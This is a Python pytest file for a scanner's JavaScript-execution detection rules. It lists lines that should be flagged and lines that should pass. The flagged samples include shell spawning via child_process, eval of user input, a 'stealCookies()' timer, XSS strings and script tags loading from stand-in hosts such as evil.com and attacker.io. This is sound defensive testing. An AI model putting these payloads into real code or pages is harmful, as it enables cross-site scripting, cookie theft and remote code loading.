"""Tests for JavaScript execution detection rules (JSEXEC-001..003)."""

from __future__ import annotations

from pathlib import Path

import pytest

from skill_scan.models import Finding, Rule, Severity
from skill_scan.rules.engine import match_line
from skill_scan.rules.loader import load_rules

RULES_PATH = (
    Path(__file__).resolve().parents[2]
    / "src"
    / "skill_scan"
    / "rules"
    / "data"
    / "javascript_execution.toml"
)


@pytest.fixture(scope="module")
def rules() -> list[Rule]:
    """Load JavaScript execution rules once for the module."""
    return load_rules(RULES_PATH)


def _match(line: str, rules: list[Rule], rule_id: str) -> bool:
    findings = match_line(line, 1, "test.md", rules)
    return any(f.rule_id == rule_id for f in findings)


def _findings(line: str, rules: list[Rule], rule_id: str) -> list[Finding]:
    return [f for f in match_line(line, 1, "test.md", rules) if f.rule_id == rule_id]


class TestJsexec001NodeCodeExecution:
    """Tests for JSEXEC-001 -- Node.js code execution detection."""

    @pytest.mark.parametrize(
        "line",
        [
            "child_process.exec('ls -la')",
            "child_process.execSync('whoami')",
            "child_process.spawn('/bin/sh', {shell: true})",
            "const cp = require('child_process')",
            "require('child_process').exec('id')",
            "const fn = new Function('return this')()",
            "new Function('a', 'return a + 1')",
            "child_process.exec(userInput)",
            "child_process.execSync(cmd)",
        ],
    )
    def test_detects_node_code_execution(self, rules: list[Rule], line: str) -> None:
        findings = _findings(line, rules, "JSEXEC-001")
        assert len(findings) >= 1
        assert findings[0].severity == Severity.CRITICAL
        assert findings[0].category == "malicious-code"

    @pytest.mark.parametrize(
        "line",
        [
            "never use child_process for user input",
            "avoid child_process in production code",
            "do not use child_process without validation",
            "documentation for child_process module",
            "Use spawn instead of exec for streaming",
            "The process.exit() method ends the process",
            "anti-pattern: using child_process directly",
        ],
    )
    def test_allows_safe_content(self, rules: list[Rule], line: str) -> None:
        assert not _match(line, rules, "JSEXEC-001")


class TestJsexec002EvalDynamicExecution:
    """Tests for JSEXEC-002 -- eval and dynamic execution detection."""

    @pytest.mark.parametrize(
        "line",
        [
            "eval(userInput)",
            "eval('alert(1)')",
            "setTimeout('document.location=evil', 1000)",
            'setInterval("stealCookies()", 5000)',
            "document.write('<script>alert(1)</script>')",
            "element.innerHTML = userControlledData",
            "el.innerHTML = payload",
            "window.location = 'data:text/html,<script>evil()</script>'",
        ],
    )
    def test_detects_eval_and_dynamic_exec(self, rules: list[Rule], line: str) -> None:
        findings = _findings(line, rules, "JSEXEC-002")
        assert len(findings) >= 1
        assert findings[0].severity == Severity.CRITICAL
        assert findings[0].category == "malicious-code"

    @pytest.mark.parametrize(
        "line",
        [
            "avoid eval in production code",
            "never use eval on user input",
            "do not use eval for JSON parsing",
            "anti-pattern: eval is dangerous",
            "setTimeout(myFunction, 1000)",
            "setInterval(callback, 5000)",
            "element.textContent = userInput",
        ],
    )
    def test_allows_safe_content(self, rules: list[Rule], line: str) -> None:
        assert not _match(line, rules, "JSEXEC-002")


class TestJsexec003ScriptInjection:
    """Tests for JSEXEC-003 -- Script injection and dynamic loading."""

    @pytest.mark.parametrize(
        "line",
        [
            '<script src="https://evil.com/payload.js">',
            "<script src=https://attacker.io/steal.js>",
            "document.createElement('script')",
            'document.createElement("script")',
            "import(`./modules/${userInput}`)",
            "import($module)",
            "import(`${base}/${name}`)",
            "require(`./plugins/${name}`)",
            "require($modulePath)",
        ],
    )
    def test_detects_script_injection(self, rules: list[Rule], line: str) -> None:
        findings = _findings(line, rules, "JSEXEC-003")
        assert len(findings) >= 1
        assert findings[0].severity == Severity.HIGH
        assert findings[0].category == "malicious-code"

    @pytest.mark.parametrize(
        "line",
        [
            "avoid dynamic import of user-supplied modules",
            "never use dynamic import for untrusted code",
            "do not inject scripts into the DOM",
            "import { useState } from 'react'",
            "const fs = require('fs')",
            "anti-pattern: dynamic script loading",
        ],
    )
    def test_allows_safe_content(self, rules: list[Rule], line: str) -> None:
        assert not _match(line, rules, "JSEXEC-003")
